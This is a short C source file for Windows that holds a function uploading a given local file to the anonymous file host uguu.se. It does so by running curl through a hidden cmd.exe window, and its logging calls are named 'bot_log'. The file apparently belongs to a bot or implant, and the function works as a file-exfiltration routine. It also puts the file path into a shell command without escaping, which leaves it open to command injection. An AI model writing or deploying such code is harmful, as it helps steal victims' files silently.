#include "header.h"

/**
 * @brief 上传指定文件到 uguu.se，返回下载链接
 *
 * @param file_path 要上传的文件路径
 * @return char* 下载链接（需要调用者 free），失败返回 NULL
 */

char* upload_to_uguu(const char* file_path) {
    // 构造临时文件名用于保存响应
    char temp_file[MAX_PATH];
    if (GetTempPathA(MAX_PATH, temp_file) == 0) {
        bot_log("[!] GetTempPathA failed\n");
        return _strdup("[!] GetTempPathA failed\n");
    }

    strcat(temp_file, "upload_result.json");

    // 构造完整的 cmd 命令
    char cmd_line[4096];
    snprintf(cmd_line, sizeof(cmd_line),
        "/c curl -F \"files[]=@%s\" https://uguu.se/upload.php  > \"%s\"",
        file_path, temp_file);

    bot_log("[i] Executing command: curl -F \"files[]=@%s\" https://uguu.se/upload.php  > \"%s\"\n",
        file_path, temp_file);

    // 执行命令
    if (run_executable("cmd.exe", cmd_line, SW_HIDE) != 0) {
        bot_log("[!] Failed to execute curl command\n");
        return _strdup("[!] Failed to execute curl command\n");
    }


    return _strdup(temp_file);
    
}